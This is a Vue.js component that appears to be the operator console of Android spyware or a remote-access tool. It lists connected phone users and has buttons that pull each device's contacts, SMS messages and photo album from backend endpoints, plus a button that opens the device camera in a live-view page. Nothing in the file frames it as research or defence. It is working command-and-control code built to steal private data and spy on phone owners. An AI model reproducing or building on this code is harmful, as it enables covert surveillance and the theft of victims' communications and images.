<template>
  <div>
    <el-breadcrumb separator-class="el-icon-arrow-right">
      <el-breadcrumb-item :to="{ path: '/home' }">首页</el-breadcrumb-item>
      <el-breadcrumb-item>用户隐私</el-breadcrumb-item>
      <el-breadcrumb-item>在线用户</el-breadcrumb-item>
    </el-breadcrumb>
    <!-- 卡片视图 -->
    <el-card>
      <!-- 搜索 添加 -->
      <el-row :gutter="100">
        <el-col :span="12">
          <el-input placeholder="输入用户手机号搜索" v-model="queryInfo.query" clearable @clear="getOnlineUser">
            <el-button slot="append" icon="el-icon-search" @click="searchUser"></el-button>
          </el-input>
        </el-col>
      </el-row>
      <!-- 用户列表区域 -->
      <el-table :data="userlist" border stripe>
        <!-- stripe: 斑马条纹
              border：边框-->
        <el-table-column align="center" sortable type="index" label="#"></el-table-column>
        <el-table-column align="center" sortable prop="user" label="用户"></el-table-column>

        <el-table-column align="center" label="获取通讯录">
          <template slot-scope="scope">
            <el-button type="primary" @click="pullAddressList(scope.row.user)">执行</el-button>
          </template>
        </el-table-column>

        <el-table-column align="center" label="获取短信">
          <template slot-scope="scope">
            <el-button type="primary" @click="pullMsg(scope.row.user)">执行</el-button>
          </template>
        </el-table-column>

        <el-table-column align="center" label="获取相册">
          <template slot-scope="scope">
            <el-button type="primary" @click="pullImg(scope.row.user)">执行</el-button>
          </template>
        </el-table-column>
        
        <el-table-column align="center" label="打开摄像头">
          <template slot-scope="scope">
            <el-button type="primary" @click="playVideo(scope.row.user)">执行</el-button>
          </template>
        </el-table-column>


      </el-table>
      <!-- 分页区域 -->
      <el-pagination :current-page="queryInfo.pageNum" :page-sizes="[10,  15]" :page-size="queryInfo.pageSize" layout="total, sizes, prev, pager, next, jumper"
        :total="total">
      </el-pagination>

    </el-card>
  </div>
</template>

<script>
  import globalData from '../../../public/Global.vue';
  export default {
    data() {
      return {
        queryInfo: {
          query: '',
          // 当前页数
          pageNum: 1,
          // 每页显示多少数据
          pageSize: 10
        },
        userlist: [],
        total: 0,
        webSocketPath: globalData.webSocketSrc + 'remote',


      }
    },

    created() {
      this.initWebsocket();
      this.getOnlineUser()

    },

    methods: {

      async searchUser() {
        if (this.queryInfo.query == '') {
            this.getOnlineUser();
          } else {
            const {
              data: res
            } = await this.$http.get('search_user/' + this.queryInfo.query)

            if (res.status !== 200) {
              return this.$message.error('搜索失败！')
            }
            this.userlist = res.androidUserList;
            this.total = res.total;
          }
        },


       
          async pullAddressList(user) {
              const {
                data: res
              } = await this.$http.get('pull_addresslist/' + user)

              if (res !== 110) {
                return this.$message.error('获取通讯录失败！')
              } else {
                return this.$message.success('获取通讯录成功！')
              }
            },

            async pullMsg(user) {
                const {
                  data: res
                } = await this.$http.get('pull_msg/' + user)

                if (res !== 120) {
                  return this.$message.error('获取短信失败！')
                } else {
                  return this.$message.success('获取短信成功！')
                }
              },


              async pullImg(user) {
                  const {
                    data: res
                  } = await this.$http.get('pull_img/' + user)

                  if (res !== 130) {
                    return this.$message.error('获取相册失败！')
                  } else {
                    return this.$message.success('获取相册成功！')
                  }
                },



                async getOnlineUser() {
                    const {
                      data: res
                    } = await this.$http.get('online_user')

                    if (res.status !== 100) {
                      return this.$message.error('获取在线用户失败！')
                    }
                    this.userlist = res.androidUserList;
                    this.total = res.total;
                  },
                  
                  playVideo(id) {
                  
                    let routeUrl = this.$router.resolve({
                      path: "/live",
                      query: {
                        userid:id
                      }
                    });
                    window.open(routeUrl.href, '_blank');
                  
                  },
                  



                  initWebsocket: function() {
                    if (typeof(WebSocket) === "undefined") {
                      alert("您的浏览器不支持socket")
                    } else {
                      // 实例化socket
                      this.socket = new WebSocket(this.webSocketPath)
                      // 监听socket连接
                      this.socket.onopen = this.open
                      // 监听socket错误信息
                      this.socket.onerror = this.error

                      // 监听socket消息
                      this.socket.onmessage = this.onMessage
                    }
                  },
                  open: function() {
                    console.log("socket连接成功")
                  },
                  error: function() {
                    console.log("连接错误")
                  },
                  onMessage: function(msg) {
                    if (msg.data === 'userChange') {
                      this.getOnlineUser();
                    }
                  },
                  send: function() {
                    this.socket.send(params)
                  },
                  close: function() {
                    console.log("socket已经关闭")
                  },

      },
    }
</script>

<style lang="less" scoped>
</style>
